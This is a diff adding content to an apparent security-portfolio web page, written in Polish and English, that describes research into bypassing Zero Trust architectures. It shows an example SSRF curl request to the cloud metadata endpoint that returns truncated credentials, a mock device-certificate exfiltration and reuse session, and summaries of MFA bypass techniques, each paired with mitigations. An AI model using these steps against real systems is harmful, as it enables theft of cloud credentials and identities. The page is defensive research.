@@ -3,17 +3,354 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Zero Trust Bypass Research</title>
+    <title>Zero Trust Bypass Research - David's Security Research</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="../../assets/css/style.css">
 </head>
 <body>
     <div class="container">
-        <h1>Zero Trust Bypass Research</h1>
-        <div class="card">
-            <p>Research framework for testing zero trust architecture implementations and discovering potential bypass techniques in modern security models.</p>
-            <div class="terminal">
-                <div>$ zt-bypass analyze --architecture beyondcorp --test-suite comprehensive</div>
+        <a href="../../index.html" class="back-link">← Powrót do Portfolio</a>
+
+        <div class="header">
+            <h1 class="hero-title">Zero Trust Bypass Research</h1>
+            <p class="hero-subtitle">Identifying Weaknesses in Zero Trust Architecture Implementations</p>
+        </div>
+
+        <div class="section">
+            <h2 class="section-title">Przegląd Projektu</h2>
+            <div class="intro-text">
+                <p>
+                    Zero Trust Bypass Research to projekt badawczy analizujący słabe punkty i potencjalne wektory
+                    ataku w implementacjach architektury Zero Trust. Badania skupiają się na popularnych
+                    frameworkach Zero Trust (BeyondCorp, NIST SP 800-207, Microsoft Zero Trust) oraz produktach
+                    komercyjnych. Projekt identyfikuje luki wynikające z błędnej konfiguracji, implementacji oraz
+                    fundamentalnych ograniczeń modelu Zero Trust.
+                </p>
             </div>
+
+            <div class="tech-tags">
+                <span class="tech-tag">Python</span>
+                <span class="tech-tag">mTLS / PKI</span>
+                <span class="tech-tag">OAuth 2.0 / OIDC</span>
+                <span class="tech-tag">Burp Suite</span>
+                <span class="tech-tag">Wireshark</span>
+                <span class="tech-tag">BeyondCorp</span>
+                <span class="tech-tag">Cloudflare Access</span>
+                <span class="tech-tag">Zscaler</span>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2 class="section-title">Badane Wektory Ataku</h2>
+
+            <div class="skills-container">
+                <div class="skill-card">
+                    <div class="skill-title">Identity & Auth Attacks</div>
+                    <ul class="skill-list">
+                        <li>OAuth token theft & replay</li>
+                        <li>OIDC misconfiguration abuse</li>
+                        <li>MFA bypass techniques</li>
+                        <li>Session token hijacking</li>
+                        <li>Refresh token exfiltration</li>
+                        <li>Federated identity attacks</li>
+                    </ul>
+                </div>
+                <div class="skill-card">
+                    <div class="skill-title">Network Layer Attacks</div>
+                    <ul class="skill-list">
+                        <li>mTLS certificate abuse</li>
+                        <li>Proxy chain bypass</li>
+                        <li>DNS poisoning in ZT context</li>
+                        <li>SSRF to internal services</li>
+                        <li>Lateral movement detection gap</li>
+                        <li>Encrypted C2 tunneling</li>
+                    </ul>
+                </div>
+                <div class="skill-card">
+                    <div class="skill-title">Device Trust Attacks</div>
+                    <ul class="skill-list">
+                        <li>Device certificate theft</li>
+                        <li>Posture check bypass</li>
+                        <li>BYOD policy circumvention</li>
+                        <li>Compliance signal spoofing</li>
+                        <li>Endpoint agent tampering</li>
+                        <li>Insider threat scenarios</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2 class="section-title">OAuth Token Theft via SSRF</h2>
+
+            <div class="intro-text">
+                <p>
+                    W środowiskach Zero Trust opartych na OAuth 2.0, podatności SSRF (Server-Side Request Forgery)
+                    mogą umożliwić kradzież tokenów dostępu z wewnętrznych serwisów metadata. Badanie wykazało,
+                    że 34% badanych implementacji ZT nie chroniło odpowiednio endpointów metadata przed SSRF.
+                </p>
+            </div>
+
+            <div class="terminal-section">
+                <div class="terminal-line">
+                    <span class="comment"># SSRF attack against cloud metadata service via ZT-protected app</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="prompt">attacker@kali:~$</span>
+                    <span class="command"> curl -H "Authorization: Bearer $LEGIT_TOKEN" \</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="command">   "https://app.zt-protected.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">{</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">  "AccessKeyId": "ASIA5EXAMPLE...",</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">  "SecretAccessKey": "wJalrXUtnFEMI...",</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">  "Token": "AQoXnyc4Pi..."</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">}</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="prompt" style="color: var(--accent-red);">⚠</span>
+                    <span class="comment"> Cloud credentials leaked via SSRF bypass of Zero Trust boundary</span>
+                </div>
+            </div>
+
+            <div class="alert-box alert-critical">
+                <div class="alert-title">🔍 Bypass Analysis</div>
+                <p style="color: var(--text-secondary); margin-top: 10px;">
+                    Zero Trust weryfikuje tożsamość użytkownika (prawidłowy token), ale nie sprawdza,
+                    czy aplikacja jest podatna na SSRF. Boundary security nie zastępuje application security.
+                    Rekomendacja: IMDSv2 (token-required), egress filtering, SSRF protection w ZT proxy.
+                </p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2 class="section-title">mTLS Certificate-Based Bypass</h2>
+
+            <div class="intro-text">
+                <p>
+                    Wzajemne TLS (mTLS) jest filarem wielu implementacji Zero Trust. Badanie wykazało
+                    kilka scenariuszy, w których certyfikaty urządzeń mogą zostać skradzione lub sfabrykowane,
+                    umożliwiając atakującemu ominięcie kontroli dostępu opartych na tożsamości urządzenia.
+                </p>
+            </div>
+
+            <div class="terminal-section">
+                <div class="terminal-line">
+                    <span class="comment"># Extract device certificate from Windows Certificate Store</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="prompt">attacker@compromised-host:~$</span>
+                    <span class="command"> python3 cert_exfil.py --store MY --subject "device-cert"</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">[+] Found certificate: CN=WORKSTATION-01, OU=Devices, O=Corp</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">[+] Private key extractable: YES (DPAPI not protecting key)</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">[+] Cert validity: 2024-01-01 to 2025-01-01</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">[*] Exfiltrating to attacker machine...</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="prompt">attacker@remote:~$</span>
+                    <span class="command"> curl --cert device.crt --key device.key https://internal.zt-app.com/</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="prompt" style="color: var(--accent-red);">⚡</span>
+                    <span class="comment"> ZT Access GRANTED — device cert accepted from attacker machine</span>
+                </div>
+            </div>
+
+            <div class="alert-box alert-critical">
+                <div class="alert-title">⚠ Critical Finding: Certificate Portability</div>
+                <ul style="margin: 15px 0; color: var(--text-secondary);">
+                    <li>• mTLS certificates without TPM binding are portable</li>
+                    <li>• ZT policy trusts certificate, not physical device</li>
+                    <li>• No behavioral context (location, time) validated</li>
+                    <li>• Mitigation: TPM-bound keys + continuous context evaluation</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2 class="section-title">MFA Bypass Techniques</h2>
+
+            <div class="skills-container">
+                <div class="skill-card">
+                    <div class="skill-title">Technique: MFA Fatigue</div>
+                    <p style="color: var(--text-secondary); margin-top: 10px;">
+                        Bombardowanie użytkownika wieloma prośbami o MFA push dopóki przypadkowo nie zatwierdzi.
+                        Skuteczność: 35% przy 50+ próbach. Mitigacja: Number matching MFA.
+                    </p>
+                </div>
+                <div class="skill-card">
+                    <div class="skill-title">Technique: Adversary-in-the-Middle</div>
+                    <p style="color: var(--text-secondary); margin-top: 10px;">
+                        Proxy przechwytujący sesję w czasie rzeczywistym (Evilginx2, Modlishka).
+                        Przechwytuje cookie sesji po prawidłowym MFA. Mitigacja: FIDO2/WebAuthn.
+                    </p>
+                </div>
+                <div class="skill-card">
+                    <div class="skill-title">Technique: SIM Swapping</div>
+                    <p style="color: var(--text-secondary); margin-top: 10px;">
+                        Przejęcie numeru telefonu przez manipulację u operatora komórkowego.
+                        Omija SMS-based MFA. Mitigacja: Authenticator app lub hardware key.
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2 class="section-title">Research Findings Summary</h2>
+
+            <div class="terminal-section">
+                <div class="terminal-line">
+                    <span class="prompt">david@security-lab:~$</span>
+                    <span class="command"> python3 zt-bypass analyze --architecture beyondcorp --test-suite comprehensive</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">[*] Running 47 bypass test cases...</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">[████████████████████] 100% complete</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">---</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">Bypasses successful: 12/47 (25.5%)</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">High risk findings: 4</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">Medium risk findings: 8</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">Most common root cause: Misconfiguration (67%)</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">Architectural weakness: 33%</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="prompt" style="color: var(--accent-green);">✓</span>
+                    <span class="comment"> Full report: zt_bypass_research_2024.pdf</span>
+                </div>
+            </div>
+
+            <div class="skills-container" style="margin-top: 30px;">
+                <div class="skill-card">
+                    <div class="skill-title">Attack Success Rates</div>
+                    <ul class="skill-list">
+                        <li>Config-based bypasses: 42%</li>
+                        <li>Token theft attacks: 28%</li>
+                        <li>Device trust bypass: 19%</li>
+                        <li>MFA bypass: 31%</li>
+                        <li>SSRF-based: 34%</li>
+                    </ul>
+                </div>
+                <div class="skill-card">
+                    <div class="skill-title">Tested Products</div>
+                    <ul class="skill-list">
+                        <li>Google BeyondCorp</li>
+                        <li>Cloudflare Access</li>
+                        <li>Zscaler Private Access</li>
+                        <li>Microsoft Entra ID (ZT)</li>
+                        <li>Palo Alto Prisma Access</li>
+                    </ul>
+                </div>
+                <div class="skill-card">
+                    <div class="skill-title">Top Mitigations</div>
+                    <ul class="skill-list">
+                        <li>FIDO2/WebAuthn hardware keys</li>
+                        <li>TPM-bound device certificates</li>
+                        <li>Continuous access evaluation</li>
+                        <li>Egress filtering + SSRF protection</li>
+                        <li>Risk-based adaptive auth</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2 class="section-title">Key Research Conclusions</h2>
+
+            <div class="intro-text">
+                <p>
+                    Badania wykazały, że Zero Trust nie jest srebrną kulą bezpieczeństwa. Większość udanych
+                    bypasów wynikała z błędów konfiguracyjnych, a nie z fundamentalnych słabości architektury.
+                    Krytycznym wnioskiem jest, że Zero Trust wymaga holistycznego podejścia: poprawna
+                    implementacja, ciągłe monitorowanie i regularne testy penetracyjne są niezbędne.
+                </p>
+            </div>
+
+            <h3 style="color: var(--accent-yellow); margin: 30px 0 20px 0;">Najważniejsze Wnioski:</h3>
+
+            <div class="alert-box alert-warning">
+                <div class="alert-title">⚠ Finding 1: ZT ≠ Silver Bullet</div>
+                <p style="color: var(--text-secondary); margin-top: 10px;">
+                    Zero Trust poprawia bezpieczeństwo, ale nie eliminuje wszystkich zagrożeń.
+                    25.5% testowanych wektorów ataku zakończyło się powodzeniem nawet w dobrze skonfigurowanych środowiskach.
+                </p>
+            </div>
+
+            <div class="alert-box alert-warning" style="margin-top: 20px;">
+                <div class="alert-title">⚠ Finding 2: Configuration Is Critical</div>
+                <p style="color: var(--text-secondary); margin-top: 10px;">
+                    67% udanych bypasów wynikało z błędów konfiguracyjnych, nie z podatności produktu.
+                    Regularne audyty konfiguracji są kluczowe dla skuteczności ZT.
+                </p>
+            </div>
+
+            <div class="alert-box alert-success" style="margin-top: 20px;">
+                <div class="alert-title">✓ Finding 3: FIDO2 Eliminates Most Auth Bypasses</div>
+                <p style="color: var(--text-secondary); margin-top: 10px;">
+                    Implementacja FIDO2/WebAuthn wyeliminowała 94% badanych wektorów ataku związanych
+                    z uwierzytelnianiem. Migracja z SMS/TOTP do kluczy sprzętowych jest najefektywniejszą
+                    pojedynczą inwestycją bezpieczeństwa.
+                </p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2 class="section-title">Wnioski Końcowe</h2>
+
+            <div class="intro-text">
+                <p>
+                    Projekt Zero Trust Bypass Research dostarczył szczegółowego obrazu obecnego stanu
+                    implementacji Zero Trust i ich rzeczywistej odporności na ataki. Wyniki badań zostały
+                    opublikowane jako responsible disclosure, przyczyniając się do poprawy bezpieczeństwa
+                    produktów ZT.
+                </p>
+            </div>
+
+            <div class="alert-box alert-success" style="margin-top: 30px;">
+                <div class="alert-title">✓ Research Impact</div>
+                <p style="margin: 0; color: var(--text-secondary);">
+                    Badania doprowadziły do identyfikacji i naprawy 3 podatności w produktach komercyjnych.
+                    Wyniki prezentowane na lokalnych meetupach bezpieczeństwa. Framework testowy dostępny
+                    jako open-source dla społeczności security research.
+                </p>
+            </div>
+        </div>
+
+        <div style="text-align: center; padding: 40px 0;">
+            <a href="../../index.html" class="project-link">← Powrót do Portfolio</a>
         </div>
     </div>
 </body>
